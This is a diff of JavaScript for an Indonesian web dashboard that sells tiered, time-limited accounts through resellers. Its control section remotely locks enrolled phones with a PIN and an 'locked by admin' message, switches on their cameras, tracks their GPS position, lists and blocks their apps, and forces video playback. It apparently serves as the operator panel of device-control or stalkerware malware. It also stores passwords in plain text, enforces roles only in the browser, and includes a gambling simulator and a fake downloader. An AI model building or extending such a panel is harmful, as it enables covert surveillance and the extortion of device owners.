+          document.getElementById('liveCountdownText').textContent = 'Sisa Masa Aktif: ' + diffDays + ' Hari Lagi';
+        }
+        if(document.getElementById('statActiveDays')) {
+          document.getElementById('statActiveDays').textContent = diffDays;
+        }
+
+        var targetDeviceId = userData.deviceId;
+        if (!targetDeviceId) {
+          if(!isAuto) {
+            errBox.textContent = 'Device Not Found (ID Perangkat kosong)!';
+            errBox.style.display = 'block';
+          }
+          return;
+        }
+
+        localStorage.setItem('milk_saved_user', u);
+        localStorage.setItem('milk_saved_pass', p);
+        window.currentSessionDeviceId = targetDeviceId;
+
+        errBox.style.display = 'none';
+        document.getElementById('login').classList.remove('active');
+        
+        if (document.getElementById('badgeDeviceType')) {
+          document.getElementById('badgeDeviceType').textContent = 'ID: ' + targetDeviceId;
+        }
+
+        if(isAuto) {
+          document.getElementById('main').classList.add('active');
+          initListener(targetDeviceId);
+          forceRefresh();
+        } else {
+          startVideoIntro(targetDeviceId);
+        }
+
+      } else {
+        if(!isAuto) {
+          errBox.textContent = 'Device Not Found / Username tidak ditemukan!';
+          errBox.style.display = 'block';
+        } else {
+          localStorage.removeItem('milk_saved_user');
+          localStorage.removeItem('milk_saved_pass');
+          goToLogin();
+        }
+      }
+    }, function(error) {
+      if(!isAuto) {
+        errBox.textContent = 'Device Not Found: ' + error.message;
+        errBox.style.display = 'block';
+      }
+    });
+
+  }, function(err) {
+    if(!isAuto) {
+      errBox.textContent = 'Gagal terhubung ke server database.';
+      errBox.style.display = 'block';
+    }
+  });
+}
+
+function setupRoleCreateUserUI(role) {
+  var cardTool = document.getElementById('toolCardCreateUser');
+  var roleField = document.getElementById('roleSelectionField');
+
+  if (!cardTool) return;
+
+  if (role === 'Admin') {
+    cardTool.style.display = 'flex';
+    if (roleField) roleField.style.display = 'block';
+    selectedRoleValue = 'Member';
+    document.getElementById('selectedRoleText').textContent = 'Member';
+    document.getElementById('resellerQuotaInfo').textContent = 'Status: Admin (Bebas buat akun & role apapun)';
+  } else if (role === 'Reseller') {
+    cardTool.style.display = 'flex';
+    if (roleField) roleField.style.display = 'block'; // Tampilkan field agar bisa melihat role Member
+    selectedRoleValue = 'Member'; // Reseller hanya bisa membuat Member
+    document.getElementById('selectedRoleText').textContent = 'Member';
+    checkResellerQuotaUI();
+  } else {
+    // Member biasa: sembunyikan card tool create user
+    cardTool.style.display = 'none';
+  }
+}
+
+function openCreateUserPage(){
+  generateRandomDeviceId();
+  selectedDurationValue = "30";
+  document.getElementById('selectedDurationText').textContent = "30 Hari (1 Bulan)";
+  if (currentUserRole === 'Reseller') {
+    selectedRoleValue = "Member";
+    document.getElementById('selectedRoleText').textContent = "Member";
+  }
+  switchFrag('create-user', document.querySelector('[data-frag=\'tools\']'));
+}
+
+/* ===== CUSTOM PICKER MODAL (PENGGANTI SELECT BAWAAN) ===== */
+let activePickerType = null;
+
+function openPickerModal(type) {
+  activePickerType = type;
+  var titleEl = document.getElementById('pickerModalTitle');
+  var subEl = document.getElementById('pickerModalSub');
+  var listEl = document.getElementById('pickerOptionList');
+  var html = '';
+
+  if (type === 'role') {
+    titleEl.textContent = 'Pilih Role Akun';
+    subEl.textContent = 'Tentukan hak akses akun baru';
+    
+    if (currentUserRole === 'Admin') {
+      var roles = [
+        { val: 'Member', label: 'Member' },
+        { val: 'Reseller', label: 'Reseller' },
+        { val: 'Admin', label: 'Admin' }
+      ];
+      roles.forEach(function(r){
+        var isSel = selectedRoleValue === r.val ? 'selected' : '';
+        html += '<div class="picker-option-item '+isSel+'" onclick="selectPickerOption(\'role\', \''+r.val+'\', \''+r.label+'\')">'+r.label+'</div>';
+      });
+    } else {
+      // Reseller hanya boleh buat Member
+      html += '<div class="picker-option-item selected" onclick="selectPickerOption(\'role\', \'Member\', \'Member\')">Member (Reseller Terbatas)</div>';
+    }
+
+  } else if (type === 'duration') {
+    titleEl.textContent = 'Pilih Masa Aktif';
+    subEl.textContent = currentUserRole === 'Reseller' ? 'Reseller maksimal 7 hari' : 'Tentukan durasi masa aktif';
+    
+    var durations = [];
+    if (currentUserRole === 'Reseller') {
+      // Reseller mentok 7 hari
+      durations = [
+        { val: '1', label: '1 Hari' },
+        { val: '7', label: '7 Hari (Maksimal Reseller)' }
+      ];
+      if(parseInt(selectedDurationValue) > 7) {
+        selectedDurationValue = '7';
+        document.getElementById('selectedDurationText').textContent = '7 Hari (Maksimal Reseller)';
+      }
+    } else {
+      durations = [
+        { val: '1', label: '1 Hari' },
+        { val: '7', label: '7 Hari' },
+        { val: '30', label: '30 Hari (1 Bulan)' },
+        { val: '365', label: '1 Tahun' },
+        { val: '99999', label: 'Selamanya (Unlimited)' }
+      ];
+    }
+
+    durations.forEach(function(d){
+      var isSel = selectedDurationValue === d.val ? 'selected' : '';
+      html += '<div class="picker-option-item '+isSel+'" onclick="selectPickerOption(\'duration\', \''+d.val+'\', \''+d.label+'\')">'+d.label+'</div>';
+    });
+
+  } else if (type === 'bet') {
+    titleEl.textContent = 'Pilih Nilai Taruhan (Bet)';
+    subEl.textContent = 'Atur taruhan slot gacor';
+    var bets = [
+      { val: '10000', label: 'Rp 10.000' },
+      { val: '50000', label: 'Rp 50.000' },
+      { val: '100000', label: 'Rp 100.000' },
+      { val: '500000', label: 'Rp 500.000' }
+    ];
+    bets.forEach(function(b){
+      var isSel = selectedBetValue === b.val ? 'selected' : '';
+      html += '<div class="picker-option-item '+isSel+'" onclick="selectPickerOption(\'bet\', \''+b.val+'\', \''+b.label+'\')">'+b.label+'</div>';
+    });
+  }
+
+  listEl.innerHTML = html;
+  openDialog('dialogCustomPicker');
+}
+
+function selectPickerOption(type, val, label) {
+  if (type === 'role') {
+    selectedRoleValue = val;
+    document.getElementById('selectedRoleText').textContent = label;
+  } else if (type === 'duration') {
+    selectedDurationValue = val;
+    document.getElementById('selectedDurationText').textContent = label;
+  } else if (type === 'bet') {
+    selectedBetValue = val;
+    document.getElementById('selectedBetText').textContent = label;
+  }
+  closeDialog('dialogCustomPicker');
+}
+/* ======================================================== */
+
+function generateRandomDeviceId(){
+  var randId = Math.floor(1000 + Math.random() * 9000);
+  document.getElementById('newDeviceIdInput').value = randId;
+}
+
+function checkResellerQuotaUI(){
+  var todayStr = new Date().toDateString();
+  var lastDate = localStorage.getItem('milk_reseller_date_' + loggedInUser);
+  var count = parseInt(localStorage.getItem('milk_reseller_count_' + loggedInUser) || '0');
+
+  if (lastDate !== todayStr) {
+    localStorage.setItem('milk_reseller_date_' + loggedInUser, todayStr);
+    localStorage.setItem('milk_reseller_count_' + loggedInUser, '0');
+    count = 0;
+  }
+
+  var remaining = 3 - count;
+  document.getElementById('resellerQuotaInfo').textContent = 'Status: Reseller (Hanya buat Member) · Kuota Hari Ini: ' + remaining + ' / 3 kali tersisa';
+  return remaining;
+}
+
+function submitCreateUser(){
+  var username = document.getElementById('newUsernameInput').value.trim();
+  var password = document.getElementById('newPasswordInput').value.trim();
+  var deviceId = document.getElementById('newDeviceIdInput').value.trim();
+  var days = parseInt(selectedDurationValue);
+  
+  var assignedRole = 'Member';
+  if(currentUserRole === 'Admin') {
+    assignedRole = selectedRoleValue;
+  } else if(currentUserRole === 'Reseller') {
+    assignedRole = 'Member';
+    if (days > 7) {
+      toast('Reseller masa aktif maksimal 7 hari!');
+      return;
+    }
+  }
+
+  if(!username || !password || !deviceId) {
+    toast('Semua kolom wajib diisi!');
+    return;
+  }
+
+  if(currentUserRole === 'Reseller') {
+    var remaining = checkResellerQuotaUI();
+    if(remaining <= 0) {
+      toast('Kuota pembuatan akun Anda hari ini sudah habis (Maksimal 3 kali)!');
+      return;
+    }
+  }
+
+  var now = new Date();
+  var options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+  var createdAtStr = now.toLocaleString('id-ID', options);
+  var expireTimestamp = now.getTime() + (days * 24 * 60 * 60 * 1000);
+  var expireAtStr = new Date(expireTimestamp).toLocaleString('id-ID', options);
+
+  db.ref('users/' + username).set({
+    username: username,
+    password: password,
+    role: assignedRole,
+    deviceId: deviceId,
+    device: 'Perangkat 1',
+    createdAt: createdAtStr,
+    expireAt: expireAtStr,
+    expireTimestamp: expireTimestamp
+  }, function(error){
+    if(error){
+      toast('Gagal membuat akun: ' + error.message);
+    } else {
+      toast('Berhasil membuat akun baru: ' + username);
+      document.getElementById('newUsernameInput').value = '';
+      document.getElementById('newPasswordInput').value = '';
+      generateRandomDeviceId();
+
+      if(currentUserRole === 'Reseller') {
+        var count = parseInt(localStorage.getItem('milk_reseller_count_' + loggedInUser) || '0') + 1;
+        localStorage.setItem('milk_reseller_count_' + loggedInUser, count);
+        checkResellerQuotaUI();
+      }
+    }
+  });
+}
+
+function uploadProfileImage(input){
+  if(input.files && input.files[0]){
+    var reader = new FileReader();
+    reader.onload = function(e){
+      userAvatar = e.target.result;
+      localStorage.setItem('milk_saved_avatar_' + loggedInUser, userAvatar);
+      updateAllAvatars(userAvatar);
+      toast('Foto profil berhasil diperbarui!');
+    };
+    reader.readAsDataURL(input.files[0]);
+  }
+}
+
+/* ===== FITUR STORY (CHAT & HOME) & DIALOG HAPUS BAWAAN CHROME ===== */
+function openStoryModal(){
+  document.getElementById('storyTextInput').value = '';
+  document.getElementById('storyMediaInput').value = '';
+  openDialog('dialogCreateStory');
+}
+
+function confirmUploadStory(){
+  var text = document.getElementById('storyTextInput').value.trim();
+  var fileInput = document.getElementById('storyMediaInput');
+  
+  if(!text && (!fileInput.files || fileInput.files.length === 0)){
+    toast('Masukkan teks atau pilih file media untuk story!');
+    return;
+  }
+
+  if(fileInput.files && fileInput.files[0]){
+    var reader = new FileReader();
+    reader.onload = function(e){
+      var mediaUrl = e.target.result;
+      var mediaType = fileInput.files[0].type.startsWith('video') ? 'video' : 'image';
+      pushStoryToFirebase(text, mediaUrl, mediaType);
+    };
+    reader.readAsDataURL(fileInput.files[0]);
+  } else {
+    pushStoryToFirebase(text, '', 'text');
+  }
+}
+
+function pushStoryToFirebase(text, mediaUrl, mediaType){
+  if(storyRef){
+    storyRef.push({
+      sender: loggedInUser,
+      avatar: userAvatar || 'https://via.placeholder.com/64',
+      isVerified: isUserVerified,
+      text: text,
+      mediaUrl: mediaUrl,
+      mediaType: mediaType,
+      viewers: { [loggedInUser]: true }, // Inisialisasi viewer pertama (pembuat story)
+      timestamp: firebase.database.ServerValue.TIMESTAMP
+    }, function(err){
+      if(!err){
+        closeDialog('dialogCreateStory');
+        toast('Story berhasil diunggah!');
+      } else {
+        toast('Gagal unggah story');
+      }
+    });
+  }
+}
+
+function triggerDeleteCurrentStory(){
+  if(confirm("Apakah Anda yakin ingin menghapus story ini?")) {
+    if(storyRef && currentViewingStoryKey){
+      storyRef.child(currentViewingStoryKey).remove().then(function(){
+        closeDialog('dialogViewStory');
+        toast('Story berhasil dihapus');
+      }).catch(function(err){
+        toast('Gagal menghapus story');
+      });
+    }
+  }
+}
+
+function viewStory(storyKey, sender, avatarUrl, encodedText, encodedMediaUrl, mediaType, timeAgo, isVerified){
+  if(storyTimer) clearTimeout(storyTimer);
+  currentViewingStoryKey = storyKey;
+
+  // Catat nama user yang melihat ke database Firebase story ini (seperti fitur Viewer WhatsApp)
+  if(storyRef && storyKey) {
+    storyRef.child(storyKey + '/viewers/' + loggedInUser).set(true);
+  }
+
+  document.getElementById('viewStoryUsernameText').textContent = sender;
+  // Centang biru di penampil story
+  document.getElementById('viewStoryBadge').innerHTML = isVerified ? '<span class="verified-badge-inline" title="Verified" style="width:14px;height:14px;font-size:9px;">✓</span>' : '';
+  document.getElementById('viewStoryAvatar').src = avatarUrl || 'https://via.placeholder.com/64';
+  document.getElementById('viewStoryTime').textContent = timeAgo;
+  
+  // Tampilkan tombol hapus hanya jika story tersebut milik user yang sedang login
+  var delBtn = document.getElementById('btnDeleteStoryModal');
+  if(sender === loggedInUser) {
+    delBtn.style.display = 'flex';
+  } else {
+    delBtn.style.display = 'none';
+  }
+  
+  var contentBox = document.getElementById('viewStoryContentBox');
+  var text = decodeURIComponent(encodedText);
+  var mediaUrl = decodeURIComponent(encodedMediaUrl);
+  
+  var html = '';
+  if(mediaType === 'image' && mediaUrl){
+    html += '<img src="'+mediaUrl+'" style="width:100%;height:100%;object-fit:contain">';
+    storyTimer = setTimeout(function(){
+      closeDialog('dialogViewStory');
+    }, 60000);
+  } else if(mediaType === 'video' && mediaUrl){
+    html += '<video controls autoplay width="100%" height="100%" style="object-fit:contain"><source src="'+mediaUrl+'"></video>';
+    storyTimer = setTimeout(function(){
+      closeDialog('dialogViewStory');
+    }, 1800000);
+  } else {
+    html += '<div style="padding:30px;font-size:20px;font-weight:700;text-align:center;color:#fff">'+text+'</div>';
+    storyTimer = setTimeout(function(){
+      closeDialog('dialogViewStory');
+    }, 60000);
+  }
+
+  if(mediaUrl && text && mediaType !== 'text'){
+    html += '<div style="position:absolute;bottom:80px;left:20px;right:20px;background:rgba(0,0,0,0.7);padding:12px 16px;border-radius:14px;font-size:14px;color:#fff;text-align:center;">'+text+'</div>';
+  }
+
+  contentBox.innerHTML = html;
+
+  // Ambil daftar viewer real-time dari Firebase untuk ditampilkan
+  db.ref('global_stories/' + storyKey + '/viewers').once('value', function(snap){
+    var viewersObj = snap.val() || {};
+    var viewerNamesArr = Object.keys(viewersObj);
+    document.getElementById('storyViewerCount').textContent = viewerNamesArr.length;
+    document.getElementById('storyViewerNames').textContent = viewerNamesArr.join(', ');
+  });
+
+  openDialog('dialogViewStory');
+}
+/* ==================================== */
+
+function openBokepPage() {
+  switchFrag('bokep', document.querySelector('[data-frag=\'tools\']'));
+}
+
+function openTikTokDownloader() {
+  switchFrag('tiktok', document.querySelector('[data-frag=\'tools\']'));
+}
+
+function processTikTokDownload() {
+  var urlInput = document.getElementById('tiktokUrlInput').value.trim();
+  if(!urlInput) {
+    toast('Masukkan link TikTok terlebih dahulu!');
+    return;
+  }
+  toast('Memproses video tanpa watermark...');
+  setTimeout(function(){
+    document.getElementById('tiktokResultArea').style.display = 'block';
+    document.getElementById('tiktokDownloadLink').href = 'https://files.catbox.moe/wru2tc.mp4';
+    toast('Video siap diunduh!');
+  }, 1000);
+}
+
+function openStreamBolaPage() {
+  switchFrag('streambola', document.querySelector('[data-frag=\'tools\']'));
+}
+
+function openSlotPage() {
+  switchFrag('slot', document.querySelector('[data-frag=\'tools\']'));
+}
+
+function spinSlotMachine() {
+  var bet = parseInt(selectedBetValue);
+  if(slotUserBalance < bet) {
+    toast('Saldo Anda tidak mencukupi untuk taruhan ini!');
+    return;
+  }
+  slotUserBalance -= bet;
+  document.getElementById('slotBalance').textContent = 'Rp ' + slotUserBalance.toLocaleString('id-ID');
+  
+  var icons = ['A', 'B', 'C', 'D', 'E', 'F'];
+  var r1 = icons[Math.floor(Math.random() * icons.length)];
+  var r2 = icons[Math.floor(Math.random() * icons.length)];
+  var r3 = icons[Math.floor(Math.random() * icons.length)];
+  
+  document.getElementById('reel1').textContent = r1;
+  document.getElementById('reel2').textContent = r2;
+  document.getElementById('reel3').textContent = r3;
+
+  if(r1 === r2 && r2 === r3) {
+    var win = bet * 50;
+    slotUserBalance += win;
+    document.getElementById('slotBalance').textContent = 'Rp ' + slotUserBalance.toLocaleString('id-ID');
+    toast('JACKPOT! Anda Menenangkan Rp ' + win.toLocaleString('id-ID') + '!');
+  } else if(r1 === r2 || r2 === r3 || r1 === r3) {
+    var win = bet * 5;
+    slotUserBalance += win;
+    document.getElementById('slotBalance').textContent = 'Rp ' + slotUserBalance.toLocaleString('id-ID');
+    toast('Menang Kecil: Rp ' + win.toLocaleString('id-ID'));
+  } else {
+    toast('Coba lagi untuk mendapatkan scatter!');
+  }
+}
+
+function openMusicPlayer(){
+  switchFrag('music-player', document.querySelector('[data-frag=\'tools\']'));
+}
+
+function renderMusicPlayerList(){
+  var html = '';
+  musicList.forEach(function(m, index){
+    html += '<div class="music-item">' +
+      '<div class="music-art">' +
+        '<svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>' +
+      '</div>' +
+      '<div class="music-info">' +
+        '<div class="music-title">'+m.title+'</div>' +
+        '<div class="music-sub">Koleksi Musik VIP</div>' +
+      '</div>' +
+      '<button class="music-play-btn" id="mBtn-'+index+'" onclick="playMusicTrack(\''+m.url+'\', \'mBtn-'+index+'\')">▶</button>' +
+    '</div>';
+  });
+  var container = document.getElementById('musicListContainer');
+  if(container) container.innerHTML = html;
+}
+
+function playMusicTrack(url, btnId){
+  var btn = document.getElementById(btnId);
+  if(currentAudioPlaying) {
+    currentAudioPlaying.pause();
+    currentAudioPlaying = null;
+    document.querySelectorAll('.music-play-btn').forEach(function(b){ b.textContent = '▶'; });
+  }
+  var audio = new Audio(url);
+  currentAudioPlaying = audio;
+  btn.textContent = '⏸';
+  audio.play().catch(function(err){
+    toast('Gagal memutar audio');
+  });
+  audio.onended = function(){
+    btn.textContent = '▶';
+    currentAudioPlaying = null;
+  };
+}
+
+function stopAllMusic(){
+  if(currentAudioPlaying) {
+    currentAudioPlaying.pause();
+    currentAudioPlaying = null;
+    document.querySelectorAll('.music-play-btn').forEach(function(b){ b.textContent = '▶'; });
+    toast('Pemutar musik dihentikan');
+  }
+}
+
+function sendGlobalChat(){
+  var txt = document.getElementById('chatInputText').value.trim();
+  if(!txt) return;
+  if(chatRef) {
+    chatRef.push({
+      sender: loggedInUser,
+      avatar: userAvatar || 'https://via.placeholder.com/32',
+      isVerified: isUserVerified,
+      text: txt,
+      type: 'text',
+      timestamp: firebase.database.ServerValue.TIMESTAMP
+    });
+    document.getElementById('chatInputText').value = '';
+  }
+}
+
+function sendChatPhoto(input){
+  if(input.files && input.files[0]){
+    var reader = new FileReader();
+    reader.onload = function(e){
+      var photoBase64 = e.target.result;
+      if(chatRef){
+        chatRef.push({
+          sender: loggedInUser,
+          avatar: userAvatar || 'https://via.placeholder.com/32',
+          isVerified: isUserVerified,
+          type: 'photo',
+          photoUrl: photoBase64,
+          text: document.getElementById('chatInputText').value.trim() || '',
+          timestamp: firebase.database.ServerValue.TIMESTAMP
+        });
+        document.getElementById('chatInputText').value = '';
+        input.value = '';
+        toast('Foto terkirim di chat global!');
+      }
+    };
+    reader.readAsDataURL(input.files[0]);
+  }
+}
+
+function toggleRecordVN(){
+  var btn = document.getElementById('btnRecordVn');
+  if(!isRecordingVN) {
+    navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream){
+      mediaRecorder = new MediaRecorder(stream);
+      audioChunks = [];
+      mediaRecorder.ondataavailable = function(e){ audioChunks.push(e.data); };
+      mediaRecorder.onstop = function(){
+        var blob = new Blob(audioChunks, { type: 'audio/webm' });
+        var reader = new FileReader();
+        reader.readAsDataURL(blob);
+        reader.onloadend = function(){
+          var base64Audio = reader.result;
+          if(chatRef){
+            chatRef.push({
+              sender: loggedInUser,
+              avatar: userAvatar || 'https://via.placeholder.com/32',
+              isVerified: isUserVerified,
+              type: 'vn',
+              audioUrl: base64Audio,
+              timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+            if(statusRef){
+              statusRef.child('voice_note').setValue({
+                audioUrl: base64Audio,
+                timestamp: Date.now()
+              });
+            }
+            toast('Voice Note terkirim!');
+          }
+        };
+      };
+      mediaRecorder.start();
+      isRecordingVN = true;
+      btn.classList.add('recording');
+      btn.innerHTML = '<svg style="width:16px;height:16px;fill:#fff" viewBox="0 0 24 24"><path d="M6 6h12v12H6z"/></svg>';
+      toast('Merekam VN... Ketuk lagi untuk kirim.');
+    }).catch(function(err){
+      toast('Gagal akses mikrofon: ' + err.message);
+    });
+  } else {
+    if(mediaRecorder) mediaRecorder.stop();
+    isRecordingVN = false;
+    btn.classList.remove('recording');
+    btn.innerHTML = '<svg style="width:18px;height:18px;fill:#fff" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1-9c0-.55.45-1 1-1s1 .45 1 1v6c0 .55-.45 1-1 1s-1-.45-1-1V5zm6 6c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>';
+  }
+}
+
+function playVN(btnElem, audioUrl){
+  if(currentAudioPlaying) {
+    currentAudioPlaying.pause();
+    currentAudioPlaying = null;
+    document.querySelectorAll('.vn-play-btn').forEach(function(b){ b.textContent = '▶'; });
+  }
+  var audio = new Audio(audioUrl);
+  currentAudioPlaying = audio;
+  btnElem.textContent = '⏸';
+  audio.play();
+  audio.onended = function(){
+    btnElem.textContent = '▶';
+    currentAudioPlaying = null;
+  };
+}
+
+function switchFrag(name, btn){
+  document.querySelectorAll('.fragment').forEach(function(f){ f.classList.remove('active'); });
+  var targetFrag = document.getElementById('frag-'+name);
+  if(targetFrag) {
+    targetFrag.classList.add('active');
+  }
+  
+  document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
+  if (btn) btn.classList.add('active');
+
+  var titles = { 
+    home:'Dashboard', 
+    devices:'Devices', 
+    tools:'Tools Tambahan', 
+    'music-player':'Pemutar Musik', 
+    chat:'Chat & VN', 
+    settings:'Settings', 
+    control:'Control',
+    bokep: 'Video Eksklusif',
+    tiktok: 'TikTok Downloader',
+    streambola: 'Live Stream Bola',
+    slot: 'PG Soft Simulator',
+    'create-user': 'Create User'
+  };
+  document.getElementById('pageTitle').textContent = titles[name] || name;
+  
+  var hideNav = ['control', 'music-player', 'bokep', 'tiktok', 'streambola', 'slot', 'create-user'].includes(name);
+  document.getElementById('bottomNav').style.display = hideNav ? 'none' : 'flex';
+  
+  if (name === 'devices') forceRefresh();
+  if (name === 'create-user') generateRandomDeviceId();
+}
+
+function renderDevices(){
+  var online=0, idle=0, html='';
+  devices.forEach(function(d,i){
+    if (d.online) online++; else idle++;
+    var displayName = d.name || 'Device Not Found';
+    html += '<div class="list-card" onclick="openControl('+i+')">' +
+      '<div class="dot'+(d.online?'':' off')+'"></div>' +
+      '<div class="info"><div class="name">'+displayName+'</div><div class="meta">ID: '+(activeDeviceId || 'N/A')+' · '+(d.online?'Online':'Offline')+'</div></div>' +
+      '<div class="arrow"><svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg></div></div>';
+  });
+  document.getElementById('deviceList').innerHTML = html;
+  document.getElementById('homeDeviceCard').innerHTML = html;
+  document.getElementById('statOnline').textContent = online;
+  document.getElementById('statIdle').textContent = idle;
+}
+
+function openControl(idx){
+  currentIdx = idx;
+  renderTools();
+  switchFrag('control', null);
+}
+
+function renderTools(){
+  var html = '';
+  tools.forEach(function(t){
+    var checked = (deviceStates[currentIdx] && deviceStates[currentIdx][t.key]) ? 'checked' : '';
+    html += '<div class="tool-box">' +
+      '<div class="icon-box"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2 z"/></svg></div>' +
+      '<div class="info"><div class="name">'+t.name+'</div><div class="tag">'+t.tag+'</div></div>' +
+      '<label class="switch-toggle"><input type="checkbox" '+checked+' onchange="toggleTool(\''+t.key+'\',\''+t.name+'\',this.checked)"><span class="slider"></span></label></div>';
+  });
+  document.getElementById('toolList').innerHTML = html;
+}
+
+function setSwitchOff(key){
+  if (!deviceStates[currentIdx]) deviceStates[currentIdx] = {};
+  deviceStates[currentIdx][key] = false;
+  renderTools();
+}
+
+function toggleTool(key, name, state){
+  if (isUpdatingSwitch) return;
+  
+  isUserInteracting = true;
+  setTimeout(function(){ isUserInteracting = false; }, 1200);
+
+  if (!deviceStates[currentIdx]) deviceStates[currentIdx] = {};
+  deviceStates[currentIdx][key] = state;
+
+  if (statusRef) {
+    var updateObj = {};
+    updateObj[key] = state;
+    if (!state) {
+      if (key === 'is_locked') { updateObj.lock_pin = ''; updateObj.warning_message = ''; }
+      if (key === 'video_url') { updateObj.video_url = ''; }
+      if (key === 'block_app') { updateObj.blocked_app = ''; }
+    }
+    statusRef.update(updateObj);
+  }
+
+  if (!state) {
+    toast(name + ' · DIMATIKAN');
+    return;
+  }
+
+  if (key === 'is_locked') {
+    openDialog('dialogLock');
+  } else if (key === 'video_url') {
+    openDialog('dialogVideo');
+  } else if (key === 'camera_active') {
+    openDialog('dialogCamera');
+  } else if (key === 'block_app') {
+    openDialog('dialogBlock');
+  } else if (key === 'gps_active') {
+    openDialog('dialogGps');
+  } else {
+    toast(name + ' · DIAKTIFKAN');
+  }
+}
+
+function openDialog(id){ document.getElementById(id).classList.add('show'); }
+function closeDialog(id){
+  if(storyTimer) clearTimeout(storyTimer);
+  document.getElementById(id).classList.remove('show');
+}
+
+function confirmLock(){
+  var pin = document.getElementById('lockPin').value || '1234';
+  var title = document.getElementById('lockTitle').value || 'PERANGKAT DIKUNCI OLEH ADMIN';
+  statusRef.update({ is_locked: true, lock_pin: pin, warning_message: title });
+  toast('Perangkat dikunci · PIN: ' + pin);
+  closeDialog('dialogLock');
+}
+
+function confirmVideo(){
+  var url = document.getElementById('videoUrl').value.trim();
+  if (!url) { toast('URL video kosong'); return; }
+  statusRef.update({ video_url: url });
+  toast('Perintah putar video dikirim');
+  closeDialog('dialogVideo');
+}
+
+function stopCamera(){
+  statusRef.update({ camera_active: false });
+  closeDialog('dialogCamera');
+  toast('Kamera dimatikan');
+}
+
+function renderAppListFromFirebase(appsMap, currentBlocked) {
+  var html = '';
+  for (var pkg in appsMap) {
+    var appName = appsMap[pkg];
+    var isBlocked = (currentBlocked === pkg || currentBlocked === pkg.replace(/\./g, '_'));
+    html += '<div class="app-item"><div class="app-icon"><svg style="width:16px;height:16px;fill:var(--accent-deep)" viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg></div><div class="app-name">'+appName+'</div>' +
+      '<button class="block-btn" style="background:'+(isBlocked?'#2ecc71':'linear-gradient(145deg,#e07a6a,#c45c4a)')+'" onclick="blockAppPkg(\''+pkg+'\', \''+appName+'\')">'+(isBlocked?'Diblokir':'Blokir')+'</button></div>';
+  }
+  document.getElementById('appListContainer').innerHTML = html || '<div style="text-align:center;padding:12px;color:var(--text-soft)">Device Not Found / Tidak ada aplikasi</div>';
+}
+
+function blockAppPkg(pkg, appName){
+  statusRef.update({ blocked_app: pkg, block_app: true });
+  toast(appName + ' berhasil diblokir');
+  closeDialog('dialogBlock');
+}
+
+function openMaps(){
+  window.open('https://maps.google.com/?q=' + lastGps.lat + ',' + lastGps.lng, '_blank');
+}
+
+function closeControl(){ switchFrag('devices', document.querySelector('[data-frag=\'devices\']')); }
+
+function setTheme(name){
+  document.body.setAttribute('data-theme', name);
+  document.querySelectorAll('.theme-card-swipe').forEach(function(c){ c.classList.remove('active'); });
+  document.getElementById('theme-'+name).classList.add('active');
+  toast('Tema · ' + name);
+}
+
+function logout(){
+  localStorage.removeItem('milk_saved_user');
+  localStorage.removeItem('milk_saved_pass');
+  window.currentSessionDeviceId = null;
+  document.getElementById('main').classList.remove('active');
+  document.getElementById('login').classList.add('active');
+  document.getElementById('pass').value = '';
+}
+
+function toast(msg){
+  var t = document.getElementById('toastElement') || document.createElement('div');
+  t.id = 'toastElement';
+  t.className = 'toast';
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(function(){ if(t) t.remove(); }, 1800);
+}
+
+document.getElementById('pass').addEventListener('keydown', function(e){ if (e.key === 'Enter') doLogin(false); });
+document.getElementById('user').addEventListener('keydown', function(e){ if (e.key === 'Enter') doLogin(false); });
+</script>
+</body>
+</html>
